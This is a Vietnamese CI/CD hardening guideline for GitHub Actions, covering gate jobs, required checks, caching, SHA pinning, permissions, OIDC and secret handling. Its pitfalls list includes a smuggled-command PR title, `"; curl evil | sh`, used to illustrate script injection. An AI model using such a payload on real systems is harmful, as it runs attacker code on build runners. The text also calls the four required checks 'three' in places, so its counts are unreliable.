---
title: CI/CD: job gate, required check, cache, bảo mật pipeline
kind: module
prefix: WF-CI
applies_to: [all]
updated: 2026-10-16
---

# CI/CD: job gate, required check, cache, bảo mật pipeline

> Pipeline là **hàng rào tập trung** (tầng 3): một job `quality` gom mọi cổng chất lượng làm required check chính (cùng `protection-guard`, `gitleaks` và `dep-audit`), chạy
> lại mọi kiểm của hook local, nhanh nhờ cache, an toàn nhờ `permissions` tối thiểu + ghim SHA + không chạy code
> lạ với quyền ghi. Ghim SHA/SBOM/provenance chi tiết ở [`../12-security/supply-chain.md`](../12-security/supply-chain.md);
> chiến lược deploy ở [`../15-operations/deployment-strategies.md`](../15-operations/deployment-strategies.md).

## Nguyên tắc

1. **Một cổng chất lượng, một tên.** `quality` (gate aggregator) gom mọi job cổng; thêm job mới không phải sửa ruleset;
   ruleset đòi đúng 4 required check `quality` · `protection-guard` · `gitleaks` · `dep-audit`, mỗi cái là job có thật; đổi tên job có guard bắt.
2. **CI là nguồn sự thật của "xanh".** Hook local có thể bị bỏ qua; mọi lint/format/type/test/scan đều chạy lại
   ở CI với cùng lệnh (đọc từ `xt.yaml`/`package.json`, không viết lại).
3. **Quyền tối thiểu, fail-closed.** `permissions: contents: read` cấp workflow; job cần ghi tự nâng; không
   `continue-on-error` trên job bảo mật; không chạy PR từ fork với secrets.
4. **Nhanh để được dùng.** Mục tiêu cổng commit < 10 phút: cache theo lockfile, chạy song song, huỷ run cũ
   (`concurrency`), chỉ chạy phần bị ảnh hưởng ở monorepo.
5. **Tái lập được.** Build từ clean checkout, lockfile, phiên bản runtime ghim (`.nvmrc`/`.python-version`/
   `go.mod`), artefact có checksum; kết quả không phụ thuộc máy ai.

## Quyết định

| Câu hỏi | Chọn | Ghi chú |
|---|---|---|
| Cấu trúc workflow | `ci.yml`: job con (lint, type, test, build, scan…) → job `quality` `needs: [...]` kiểm `needs.*.result == 'success'` | Không thêm required check rời cho từng job con (ruleset lệch tên); ruleset giữ 3 tên cố định `quality`, `protection-guard`, `gitleaks`, `dep-audit` |
| Trigger | `pull_request` + `push: branches: [main]` + `merge_group` (nếu merge queue) + `schedule` có offset phút | `pull_request_target` chỉ khi thật cần quyền và **không checkout code PR** |
| Cache | `actions/setup-*` cache built-in theo lockfile; `actions/cache` cho browser/tool với key `hashFiles(lockfile)` | Cache theo nhánh/ngày (miss liên tục) |
| Ghim action | Full commit SHA + comment version; Dependabot `github-actions` cập nhật | Tag `@v4` chỉ cho action chính chủ GitHub nếu chấp nhận rủi ro — ghi ADR |
| Secrets trong CI | OIDC tới cloud thay khoá dài hạn; `environment` có required reviewers cho deploy prod | Khoá cloud trong repo secrets dùng cho mọi job |
| Deploy | CD tách workflow, kích bởi tag/release hoặc merge `main` → staging tự động → prod qua environment gate | Deploy prod trong job test |
| Self-hosted runner | Chỉ repo private, ephemeral/just-in-time | Public repo (PR lạ chiếm runner) |

## Checklist

- [ ] `WF-CI-001` **MUST** Có job `quality` gom mọi cổng chất lượng (một job luôn chạy; nếu tách job con thì `needs` mọi job cổng và fail khi bất kỳ job con không `success`). Ruleset đòi đúng 4 required check `quality` · `protection-guard` · `gitleaks` · `dep-audit`; mỗi context phải là job có thật, `protection-guard` đối chiếu tên ([`git-and-branching.md`](git-and-branching.md)). → Kiểm: `.github/rulesets/main.json` có đúng 3 context đó; `protection-guard` đỏ khi context không khớp job nào trong `.github/workflows/`; nếu tách job con, `quality` có `if: always()` kiểm `needs`. · Nguồn: catalog 23 §2.5 (gate aggregator ADR-0003), 13 §4b
- [ ] `WF-CI-002` **MUST@L** CI chạy lại mọi kiểm của hook local (lint, format check, type, test, secret scan) bằng **cùng lệnh** từ một nguồn (`xt.yaml`/`package.json`/`Makefile`), không viết lệnh khác trong YAML. → Kiểm: diff lệnh hook ↔ CI = cùng script; `pre-commit run --all-files` hoặc `scripts/dev-task.sh gate` trong CI. · Nguồn: pre-commit docs (CI), catalog 23 §4.3 (`/gate` đọc động job CI)
- [ ] `WF-CI-003` **MUST** `permissions:` khai báo tường minh ở cấp workflow với mặc định `contents: read`; job cần ghi (release, comment) tự nâng tối thiểu; không dùng `write-all`. → Kiểm: actionlint/zizmor không cảnh báo thiếu permissions; grep `permissions: write-all` = 0. · Nguồn: GitHub Security hardening for Actions
- [ ] `WF-CI-004` **MUST** Không nội suy input không tin cậy (`github.event.pull_request.title/body`, branch name, issue) trực tiếp vào `run:`; đưa qua `env:` và quote; `pull_request_target`/`workflow_run` không checkout code PR. → Kiểm: zizmor `template-injection`/`dangerous-triggers` = 0 finding. · Nguồn: GitHub Security hardening (script injection)
- [ ] `WF-CI-005` **MUST** Action bên thứ ba ghim full commit SHA (kèm comment version); Dependabot ecosystem `github-actions` bật; chi tiết chuỗi cung ứng ở [`../12-security/supply-chain.md`](../12-security/supply-chain.md). → Kiểm: `pinact`/zizmor `unpinned-uses` = 0; `dependabot.yml` có `github-actions`. · Nguồn: GitHub Security hardening (pin SHA)
- [ ] `WF-CI-006` **MUST@L** Không `continue-on-error: true` trên job bảo mật/cổng (secret scan, dependency audit, authz test); ngoại lệ phải ghi lý do + ngày hết hạn. → Kiểm: fitness function đọc YAML: job có nhãn gate không có `continue-on-error`. · Nguồn: catalog 23 §3.3 (authz-gate không được `continue-on-error`), P7
- [ ] `WF-CI-007` **MUST@L** Phiên bản runtime và toolchain ghim một nơi (`.nvmrc`/`.node-version`, `.python-version`/`pyproject`, `go.mod`, `.tool-versions`/`mise.toml`) và CI đọc từ đó; cài bằng lockfile (`npm ci`, `uv sync --frozen`, `go mod download`, `./mvnw -B`). → Kiểm: workflow dùng `node-version-file`/`python-version-file`; không hard-code version trong YAML. · Nguồn: P5
- [ ] `WF-CI-008` **MUST@L** `concurrency` theo workflow + ref với `cancel-in-progress: true` cho PR (không cho `main`/release). → Kiểm: `concurrency.group: ${{ github.workflow }}-${{ github.head_ref || github.run_id }}`. · Nguồn: GitHub Control the concurrency of workflows
- [ ] `WF-CI-009` **MUST@L** Mỗi job có `timeout-minutes` (mặc định 360 phút là quá dài); cổng commit tổng < 10–15 phút, đo và theo dõi. → Kiểm: mọi job có `timeout-minutes`; metric thời gian job. · Nguồn: P10
- [ ] `WF-CI-010` **MUST@L** Cache dependency theo hash lockfile (`setup-*` built-in hoặc `actions/cache` với `key: ${{ runner.os }}-<tool>-${{ hashFiles('**/lockfile') }}` + `restore-keys`); cache browser/tool nặng (Playwright) theo phiên bản. → Kiểm: log CI có `Cache restored`; thời gian cài < 1 phút khi hit. · Nguồn: GitHub Caching dependencies (10 GB/repo, dọn sau 7 ngày không dùng)
- [ ] `WF-CI-011` **MUST@L** Secrets: dùng OIDC (`id-token: write`) để lấy credential cloud ngắn hạn; không khoá dài hạn trong repo secrets khi nền tảng hỗ trợ OIDC; secrets deploy prod đặt trong `environment` có required reviewers. → Kiểm: workflow deploy có `id-token: write` + `aws-actions/configure-aws-credentials`/tương đương role; environment `production` có reviewer. · Nguồn: GitHub Security hardening (OIDC), Managing environments
- [ ] `WF-CI-012` **MUST@L** Pipeline CD tách khỏi CI: staging tự động sau merge `main`; production qua environment gate (reviewer, deployment branches chỉ `main`/tag); migration chạy có kiểm soát theo [`../09-database/migrations.md`](../09-database/migrations.md). → Kiểm: `deploy.yml` dùng `environment: production` với protection rules; log deploy có người duyệt. · Nguồn: GitHub Managing environments for deployment
- [ ] `WF-CI-013` **MUST@L** Build artefact một lần, dùng lại cho test/deploy (không build lại ở mỗi môi trường); artefact có checksum/SBOM và tag theo commit SHA. → Kiểm: `upload-artifact`/registry image tag = `sha-<commit>`; deploy kéo đúng tag. · Nguồn: 12-factor V Build, release, run
- [ ] `WF-CI-014` **MUST@L** Workflow `schedule` (audit tuần, dọn dẹp) đặt phút lệch (không `0 * * * *`), có `timeout`, và tạo **một** issue có marker thay vì spam. → Kiểm: cron expr phút ≠ 0/30; job tìm issue có marker trước khi tạo. · Nguồn: GitHub schedule (trễ đầu giờ), catalog 23 §2.5 (jitter 02:29/03:17…)
- [ ] `WF-CI-015` **MUST@L** Self-hosted runner chỉ ephemeral/just-in-time, không dùng cho repo public; runner có network egress allowlist. → Kiểm: cấu hình runner `--ephemeral`; repo public dùng hosted runner. · Nguồn: GitHub Security hardening (self-hosted runners)
- [ ] `WF-CI-016` **SHOULD** Lint workflow: actionlint + zizmor chạy trong CI trên `.github/workflows/**`; CODEOWNERS yêu cầu review thay đổi workflow. → Kiểm: job tồn tại; CODEOWNERS có `/.github/`. · Nguồn: GitHub Security hardening (CODEOWNERS cho workflows)
- [ ] `WF-CI-017` **SHOULD** Monorepo: path filter/affected graph để chỉ chạy phần đổi, nhưng `quality` vẫn tổng hợp; job bỏ qua báo `skipped` được `quality` chấp nhận có điều kiện. → Kiểm: `quality` xử lý `needs.*.result in ['success','skipped']` theo quy tắc rõ.
- [ ] `WF-CI-018` **SHOULD** Test flaky: retry có trần (vd 2) **kèm** ghi nhận và ticket; không retry vô hạn để che lỗi; theo dõi tỉ lệ flaky. → Kiểm: cấu hình retries ≤ 2; dashboard flaky; xem [`../14-testing-quality/test-strategy.md`](../14-testing-quality/test-strategy.md).
- [ ] `WF-CI-019` **SHOULD** Báo cáo/log test upload làm artefact (retention ngắn, vd 7 ngày); không upload secrets/dump. → Kiểm: `upload-artifact` với `retention-days`; không có `.env` trong artefact.
- [ ] `WF-CI-020` **SHOULD** Fitness function cho chính CI: script kiểm `permissions` có mặt, không `write-all`, mọi `uses:` ghim SHA, job gate không `continue-on-error`, required check ↔ job khớp. → Kiểm: `xt.py ci-check` exit 0 trong cổng `lint` (bản có sẵn của khung; required check ↔ job do `protection-guard`); test thay đổi xấu → đỏ. · Nguồn: catalog 23 §3.3
- [ ] `WF-CI-021` **MAY** Preview deploy cho mỗi PR (URL trong PR) dùng environment riêng, dữ liệu giả, tự xoá khi đóng PR ([`environments-and-config.md`](environments-and-config.md)). → Kiểm: job preview + job cleanup on `closed`.
- [ ] `WF-CI-022` **MAY** Agent tự sửa CI đỏ: trần số lần re-run/sửa (vd 3), cấm skip/disable test, cấm rewrite history; xem [`../11-autonomous-loop/self-healing-ci.md`](../11-autonomous-loop/self-healing-ci.md). → Kiểm: cấu hình trần; log số lần.
- [ ] `WF-CI-023` **MUST@L** Workflow có trigger `pull_request` (cả PR cùng repo, không riêng fork) không tham chiếu `secrets.*` ngoài `GITHUB_TOKEN`, trừ job có `environment:` kèm required reviewers; job cần secret chỉ chạy khi push nhánh chính hoặc `workflow_dispatch`, và chạy công cụ từ thư mục sạch (không phải thư mục chứa code PR). Lý do: với autopilot, PR là code agent viết, có thể đã dính injection. → Kiểm: `xt.py ci-check` báo lỗi khi workflow có `pull_request` (hoặc `pull_request_target`) mà job không có `environment:` lại chứa `secrets.X`/`secrets[...]`/`secrets: inherit` (X ≠ `GITHUB_TOKEN`); ngoại lệ có chủ đích `# ci-check-allow: <lý do>` trên dòng đó; reviewer của environment kiểm trên GitHub, không kiểm được bằng máy. · Nguồn: stored 12 §3f (garak chỉ chạy khi push `main`/chạy tay, không trên `pull_request`, chạy trong thư mục trống)

## Bẫy thường gặp

- **Nhiều required check rời rạc.** Thêm/đổi tên job → ruleset lệch → nhánh khoá hoặc cổng hở. Một `quality` gom + `protection-guard` đối chiếu (cộng `gitleaks`).
- **CI "xanh rỗng".** Job skip khi chưa có `package.json` (khung cũ) hoặc `if:` sai → mọi thứ xanh mà không chạy gì. `quality` phải fail khi job con `skipped` ngoài quy tắc; smoke "cổng chặn được lỗi" ở G5.
- **`pull_request_target` + checkout PR head.** PR từ fork chạy code lạ với secrets. Không checkout code PR trong trigger có quyền.
- **Nội suy title PR vào `run:`.** Title `"; curl evil | sh` chạy trên runner. Qua `env:` và quote.
- **Action tag di động.** Tag bị dời sang commit độc (sự cố supply chain đã có tiền lệ). Ghim SHA + Dependabot actions.
- **Cache key theo ngày/nhánh.** Miss liên tục, hoặc cache "độc" từ nhánh khác. Key theo hash lockfile + `restore-keys` tiền tố.
- **Retry test flaky vô hạn.** Che lỗi race thật. Trần 2 + ticket.
- **Deploy prod trong job test.** Test đỏ nửa chừng đã deploy. CD tách, environment gate.
- **Cron `0 0 * * *`.** Trễ/drop ở đầu giờ do tải chung. Phút lệch.
- **`continue-on-error` trên secret scan "để CI xanh".** Lỗ hổng âm thầm. Cổng bảo mật fail-closed; sửa nguyên nhân.
- **Lệnh CI khác lệnh hook.** Local xanh, CI đỏ (hoặc ngược lại). Một nguồn lệnh (`xt.yaml`), hook và CI cùng gọi.
- **Secret trong job chạy trên `pull_request` "vì PR cùng repo là tin được".** PR fork không nhận secret, nhưng PR cùng repo (kể cả do agent mở) nhận; code PR chạy cạnh secret. Job cần secret chỉ chạy khi push nhánh chính/`workflow_dispatch`, chạy công cụ từ thư mục sạch (`WF-CI-023`).

## Cổng tự động

| Công cụ | Lệnh / cấu hình | Đặt ở | Ngưỡng |
|---|---|---|---|
| actionlint (MIT) v1.7.12 | `actionlint` | pre-commit + CI | 0 lỗi |
| zizmor (MIT) 1.30.1 | `zizmor --min-severity medium .github/workflows` | CI | 0 finding ≥ medium |
| pinact / ratchet | `pinact run --check` | CI | 100% `uses:` ghim SHA (chi tiết [`../12-security/supply-chain.md`](../12-security/supply-chain.md)) |
| `xt.py ci-check` | `xt.py ci-check` (đọc YAML workflow: `permissions`, ghim SHA, `timeout-minutes`, `continue-on-error`, secret trên `pull_request` — `WF-CI-023`) | CI (trong `lint`) | 0 vi phạm |
| protection-guard | job trong `ci.yml`: `required_status_checks` của `.github/rulesets/main.json` ↔ tên job thật; API rules kiểm ruleset đang áp | CI required | Đỏ khi required check không khớp job; cảnh báo khi ruleset chưa hiệu lực (đổi `::warning` thành `exit 1` để ép) |
| Thời gian cổng | đo `quality` end-to-end | CI | < 10–15 phút, cảnh báo khi vượt |
| Cache | `actions/setup-node@<sha>` `cache: npm` · `actions/setup-python` `cache: pip` · `actions/setup-go` | CI | Hit ratio theo dõi |
| OIDC | `permissions: id-token: write` + provider action | CD | Không khoá dài hạn |

## Nguồn

- GitHub — Security hardening for GitHub Actions (pin SHA, `permissions`, script injection, `pull_request_target`, OIDC, CODEOWNERS cho workflows, self-hosted runners): <https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions> — xác minh 2026-10-13
- GitHub — Caching dependencies to speed up workflows (10 GB/repo, dọn sau 7 ngày, `setup-*` cache): <https://docs.github.com/en/actions/using-workflows/caching-dependencies-to-speed-up-workflows> — xác minh 2026-10-13
- GitHub — Control the concurrency of workflows and jobs: <https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/control-the-concurrency-of-workflows-and-jobs> — xác minh 2026-10-13
- GitHub — Events that trigger workflows (`schedule` ≥ 5 phút, trễ đầu giờ; `merge_group`): <https://docs.github.com/en/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows> — xác minh 2026-10-13
- GitHub — Managing environments for deployment (required reviewers ≤ 6, wait timer, deployment branches, prevent self-review): <https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-deployments/managing-environments-for-deployment> — xác minh 2026-10-13
- GitHub — REST Rules / rulesets: <https://docs.github.com/en/rest/repos/rules> — xác minh 2026-10-13
- pre-commit — dùng trong CI: <https://pre-commit.com/> — xác minh 2026-10-13
- The Twelve-Factor App — V. Build, release, run (chưa fetch riêng ngày 2026-10-13; III và X đã xác minh): <https://12factor.net/>
- Phiên bản (Go proxy/PyPI, xác minh 2026-10-13): actionlint v1.7.12, zizmor 1.30.1, gitleaks v8.30.1. (chưa xác minh) pinact, ratchet.
- Khung cũ X-stored commit `1b80fe4`: `.github/workflows/ci.yml` (quality, e2e, protection-guard; bài học "xanh rỗng" khi thiếu `package.json`), `release.yml`, `secret-scan.yml`; `research/2026-10-13-old-framework-analysis.md` §4 (0/20 action ghim SHA, thiếu `permissions`).
- `research/2026-10-13-stored-catalog-extraction.md` §2.7, §2.11 (ma trận vệ sinh), §4; catalog `23-own-repos-lessons` §2.5, §3.3, §4.3, §8.1; `13-dev-stack-devops` §4b–4c.
- Catalog `seeker19110/stored` mục 12 §3f (workflow red-team chạy garak với khoá API chỉ khi push `main` hoặc chạy tay, không bao giờ trên `pull_request`, chạy trong thư mục trống để file trong PR không đè gói công cụ) — đọc 2026-10-16.
